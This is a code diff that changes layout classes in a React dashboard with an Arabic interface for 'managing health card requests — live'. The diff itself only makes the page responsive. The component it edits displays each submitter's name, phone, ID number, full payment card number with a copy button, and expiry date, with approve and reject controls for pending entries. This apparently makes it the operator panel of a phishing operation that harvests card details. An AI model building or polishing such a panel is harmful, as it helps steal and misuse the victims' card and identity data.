@@ -184,12 +184,12 @@ export default function Dashboard() {
   return (
     <div className="min-h-screen bg-gray-100" dir="rtl">
       <div className="bg-[#8A1538] text-white py-4 px-4 shadow-lg">
-        <div className="max-w-7xl mx-auto flex items-center justify-between">
+        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row sm:items-center justify-between gap-3">
           <div>
             <h1 className="text-lg font-bold">لوحة التحكم</h1>
             <p className="text-white/60 text-xs">إدارة طلبات البطاقة الصحية — مباشر</p>
           </div>
-          <div className="flex items-center gap-3">
+          <div className="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-start">
             <span className="hidden sm:block text-xs text-white/70">{user.email}</span>
             <Button onClick={handleLogout} size="sm" variant="outline"
               className="border-white/30 text-white bg-white/10 hover:bg-white/20 gap-1.5 text-xs">
@@ -240,7 +240,7 @@ export default function Dashboard() {
 
               return (
                 <div key={sub.id} className="bg-white rounded-2xl shadow-sm overflow-hidden border border-gray-100">
-                  <div className="flex items-center justify-between px-5 py-3 border-b border-gray-100 bg-gray-50/60">
+                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 px-5 py-3 border-b border-gray-100 bg-gray-50/60">
                     <div className="flex items-center gap-2">
                       <span className={`px-2.5 py-1 rounded-full text-xs font-semibold ${cls}`}>{label}</span>
                       <span className="text-xs text-gray-400">رقم الهوية: <span className="font-mono font-semibold text-gray-700">{sub.id}</span></span>
@@ -272,7 +272,7 @@ export default function Dashboard() {
                           <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                             <UserIcon className="w-3.5 h-3.5" /> المعلومات الشخصية
                           </h3>
-                          <div className="grid grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
+                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
                             <InfoRow label="الاسم الكامل" value={sub.name} />
                             <InfoRow label="رقم الهاتف" value={sub.phone} mono copyable />
                             <InfoRow label="رقم الهوية" value={sub.id} mono copyable />
@@ -284,8 +284,8 @@ export default function Dashboard() {
                           <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                             <Shield className="w-3.5 h-3.5" /> بيانات البطاقة
                           </h3>
-                          <div className="grid grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
-                            <div className="col-span-2">
+                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
+                            <div className="sm:col-span-2">
                               <InfoRow label="رقم البطاقة" value={groupedCard} mono copyable />
                             </div>
                             <InfoRow label="تاريخ الانتهاء" value={sub.dateMonth && sub.datayaer ? `${sub.dateMonth}/${sub.datayaer}` : '—'} mono />
@@ -313,7 +313,7 @@ export default function Dashboard() {
                         )}
 
                         {isPending && (
-                          <div className="flex gap-3 pt-1">
+                          <div className="flex flex-col sm:flex-row gap-3 pt-1">
                             <Button
                               disabled={isUpdating}
                               onClick={() => updateState(sub.id, 'approved')}
